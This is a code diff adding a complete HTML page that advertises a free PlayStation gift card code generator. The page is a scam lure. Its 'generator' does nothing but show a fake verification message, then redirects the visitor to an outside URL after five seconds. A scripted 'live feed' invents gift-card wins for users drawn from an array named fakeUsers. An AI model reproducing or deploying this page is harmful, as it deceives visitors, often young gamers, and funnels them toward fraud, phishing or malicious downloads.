@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free PlayStation Gift Card Codes Generator</title>
+  <meta name="description" content="Generate Free PlayStation Gift Card Codes Instantly with our easy-to-use tool.">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background: #121212;
+      color: #fff;
+      overflow-x: hidden;
+    }
+    .header {
+      background: #1d1d1f;
+      padding: 3rem 0;
+      text-align: center;
+      border-bottom: 5px solid #003B5C;
+    }
+    .header h1 {
+      font-size: 3rem;
+      color: #fff;
+      margin-bottom: 0.5rem;
+      font-weight: bold;
+    }
+    .header p {
+      font-size: 1.1rem;
+      color: #A0A0A0;
+    }
+    .steps {
+      padding: 3rem 1rem;
+      text-align: center;
+      background: #181818;
+    }
+    .steps h2 {
+      font-size: 2rem;
+      margin-bottom: 2rem;
+      color: #fff;
+    }
+    .step-box {
+      background: #222;
+      padding: 2rem;
+      margin: 1rem 0;
+      border-radius: 10px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+      transition: transform 0.3s;
+    }
+    .step-box:hover {
+      transform: scale(1.05);
+    }
+    .step-box span {
+      font-size: 1.2rem;
+      color: #A0A0A0;
+    }
+    .generator {
+      text-align: center;
+      margin-top: 3rem;
+    }
+    .btn-start {
+      background: #003B5C; /* PlayStation blue */
+      color: white;
+      border: none;
+      padding: 1.5rem 3rem;
+      border-radius: 50px;
+      font-size: 1.5rem;
+      cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.3s ease;
+    }
+    .btn-start:hover {
+      background-color: #005C80; /* Darker PlayStation blue */
+      transform: scale(1.1);
+    }
+    .progress {
+      width: 80%;
+      height: 8px;
+      background: #333;
+      border-radius: 10px;
+      margin: 1.5rem auto;
+      overflow: hidden;
+    }
+    .bar {
+      height: 100%;
+      background: #003B5C; /* PlayStation blue */
+      width: 0;
+      animation: loadBar 5s forwards;
+    }
+    .status {
+      font-size: 1rem;
+      margin-top: 1rem;
+      color: #A0A0A0;
+    }
+    .live-feed {
+      margin-top: 2rem;
+      font-size: 1rem;
+      background: #222;
+      padding: 1rem;
+      border-radius: 10px;
+      max-width: 90%;
+      margin-left: auto;
+      margin-right: auto;
+      height: 150px;
+      overflow: hidden;
+    }
+    .feed-entry {
+      opacity: 0;
+      animation: fadeInFeed 1s ease-in-out forwards;
+    }
+    @keyframes fadeInFeed {
+      to { opacity: 1; }
+    }
+    @keyframes loadBar {
+      0% { width: 0; }
+      100% { width: 100%; }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1>Free PlayStation Gift Card Generator</h1>
+    <p>Instantly Generate Free PlayStation Gift Card Codes. 100% free & Safe!</p>
+  </div>
+  <div class="steps">
+    <h2>Follow the Simple Steps</h2>
+    <div class="step-box">
+      <strong>Step 1:</strong>
+      <span>Enter your PlayStation Username</span>
+    </div>
+    <div class="step-box">
+      <strong>Step 2:</strong>
+      <span>Select the amount for your Gift Card</span>
+    </div>
+    <div class="step-box">
+      <strong>Step 3:</strong>
+      <span> Click The Generate </span>
+    </div>
+  </div>
+  <div class="generator">
+    <div class="progress">
+      <div class="bar"></div>
+    </div>
+    <div class="status">Connecting to PlayStation servers...</div>
+    <button class="btn-start" onclick="startGenerator()">Start Generator</button>
+  </div>
+  <div class="live-feed" id="liveFeed"></div>
+
+  <script>
+    function startGenerator() {
+      document.querySelector('.status').innerText = "Verifying... Please wait...";
+      setTimeout(() => {
+        window.location.href = "https://free-tools.raj-solution.com/077ab49";
+      }, 5000);
+    }
+
+    const fakeUsers = ["@alex23", "@john_doe", "@sarah_play", "@player_x", "@epicgamer", "@level_up"];
+    const amounts = ["$10", "$20", "$50", "$100"];
+
+    function randomItem(arr) {
+      return arr[Math.floor(Math.random() * arr.length)];
+    }
+
+    function generateFeed() {
+      const feed = document.getElementById("liveFeed");
+      const entry = document.createElement("div");
+      entry.className = "feed-entry";
+      entry.innerText = `${randomItem(fakeUsers)} just generated ${randomItem(amounts)} PlayStation Gift Card 🎮`;
+      feed.appendChild(entry);
+      if (feed.children.length > 6) feed.removeChild(feed.children[0]);
+    }
+    setInterval(generateFeed, 3000);
+  </script>
+</body>
+</html>
